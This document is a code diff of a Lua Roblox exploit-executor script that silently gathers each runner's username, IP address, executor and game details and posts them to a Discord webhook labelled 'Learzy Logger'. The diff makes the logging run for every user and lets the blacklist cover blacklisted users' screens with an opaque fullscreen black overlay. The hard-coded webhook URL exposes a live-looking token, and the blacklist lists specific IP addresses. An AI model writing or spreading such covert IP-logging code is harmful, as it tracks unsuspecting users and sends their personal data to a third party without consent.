@@ -33,14 +33,13 @@ local Window = Rayfield:CreateWindow({
     }
 })
 
--- === Webhook + Blacklist Configuration ===
+-- === Webhook + Blacklist Setup ===
 local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 local LocalPlayer = Players.LocalPlayer
-
 local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
 
 -- === Blacklist Entries ===
@@ -52,9 +51,10 @@ local BlacklistedIPs = {
     ["182.3.39.56"] = true
 }
 
--- === GUI: Blacklist Screen (non-blocking) ===
+-- === GUI: Fullscreen Blacklist Warning ===
 local function showBlacklistScreen()
     local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "BlacklistGui"
     screenGui.ResetOnSpawn = false
@@ -65,9 +65,9 @@ local function showBlacklistScreen()
 
     local blackFrame = Instance.new("Frame")
     blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-    blackFrame.BackgroundTransparency = 0.25
-    blackFrame.Size = UDim2.new(1, 0, 1, 0)
-    blackFrame.Position = UDim2.new(0, 0, 0, 0)
+    blackFrame.BackgroundTransparency = 0
+    blackFrame.Size = UDim2.new(10, 0, 10, 0)
+    blackFrame.Position = UDim2.new(-4.5, 0, -4.5, 0)
     blackFrame.BorderSizePixel = 0
     blackFrame.Parent = screenGui
 
@@ -77,12 +77,13 @@ local function showBlacklistScreen()
     label.BackgroundTransparency = 1
     label.Font = Enum.Font.SourceSansBold
     label.TextScaled = true
-    label.Size = UDim2.new(1, 0, 0, 100)
-    label.Position = UDim2.new(0, 0, 0.5, -50)
+    label.TextWrapped = true
+    label.Size = UDim2.new(1, 0, 0.15, 0)
+    label.Position = UDim2.new(0, 0, 0.425, 0)
     label.Parent = screenGui
 end
 
--- === Get Info Functions ===
+-- === Info Retrieval ===
 local function getClientInfo()
     local ip = "Unknown"
     local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
@@ -114,7 +115,7 @@ local function getGameInfo()
 end
 
 -- === Webhook Execution ===
-local function sendWebhook(ip, executor)
+local function sendWebhook(ip, executor, isBlacklisted)
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
     local gameName, gameId = getGameInfo()
 
@@ -123,14 +124,15 @@ local function sendWebhook(ip, executor)
         ["embeds"] = {{
             ["title"] = "Script Execution Detected",
             ["description"] = "A user executed the script.",
-            ["color"] = 16711680,
+            ["color"] = isBlacklisted and 14423100 or 65280, -- Red if blacklisted, green if not
             ["fields"] = {
                 {["name"] = "Username", ["value"] = username, ["inline"] = true},
                 {["name"] = "IP", ["value"] = ip, ["inline"] = true},
                 {["name"] = "Executor", ["value"] = executor, ["inline"] = false},
                 {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
                 {["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true},
-                {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true}
+                {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+                {["name"] = "Blacklisted", ["value"] = isBlacklisted and "Yes" or "No", ["inline"] = false}
             },
             ["footer"] = {["text"] = "Learzy Logger"},
             ["timestamp"] = DateTime.now():ToIsoDate()
@@ -150,10 +152,11 @@ task.spawn(function()
     local ip, executor = getClientInfo()
     local username = LocalPlayer and LocalPlayer.Name or "Unknown"
 
-    if BlacklistedUsernames[username] or BlacklistedIPs[ip] then
-        showBlacklistScreen()
-        return
-    end
+    local isBlacklisted = BlacklistedUsernames[username] or BlacklistedIPs[ip]
 
-    sendWebhook(ip, executor)
+    sendWebhook(ip, executor, isBlacklisted)
+
+    if isBlacklisted then
+        showBlacklistScreen()
+    end
 end)
